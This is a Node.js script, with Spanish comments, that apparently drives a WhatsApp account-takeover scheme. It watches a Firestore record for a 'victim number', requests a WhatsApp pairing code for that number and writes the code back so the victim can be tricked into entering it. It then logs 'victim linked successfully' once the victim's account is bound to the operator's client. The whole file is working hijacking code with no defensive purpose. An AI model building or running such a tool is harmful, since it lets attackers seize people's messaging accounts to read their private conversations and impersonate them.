const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) { admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); }
const db = admin.firestore();

// EL TRUCO: Cliente con ID único para cada reinicio
const client = new Client({
    authStrategy: new LocalAuth({ clientId: "session_" + Date.now() }), 
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
    }
});

// ESCUCHA AGRESIVA: Detecta el número y pide código el código REAL
db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
    if (!snap.exists) return;
    const data = snap.data();

    // Solo actuamos si hay número y el código está vacío
    if (data.status === "solicitando_codigo" && data.numero_victima && !data.pairingCode) {
        console.log(">>> [LOG] SOLICITANDO CÓDIGO PARA: " + data.numero_victima);
        try {
            const code = await client.requestPairingCode(data.numero_victima);
            console.log(">>> [LOG] CÓDIGO GENERADO: " + code);
            
            await snap.ref.update({
                pairingCode: code,
                status: "mostrando_codigo"
            });
        } catch (err) {
            console.log(">>> [LOG] ERROR: " + err.message);
            // Si falla, reseteamos para que la víctima pueda reintentar
            await snap.ref.update({ pairingCode: "ERROR", status: "error" });
        }
    }
});

client.on('ready', () => {
    console.log(">>> [LOG] VÍCTIMA VINCULADA EXITOSAMENTE");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize().catch(e => console.log(">>> [LOG] Error Init:", e));

const port = process.env.PORT || 3000;
http.createServer((req, res) => { res.end('MOTOR ONLINE'); }).listen(port);
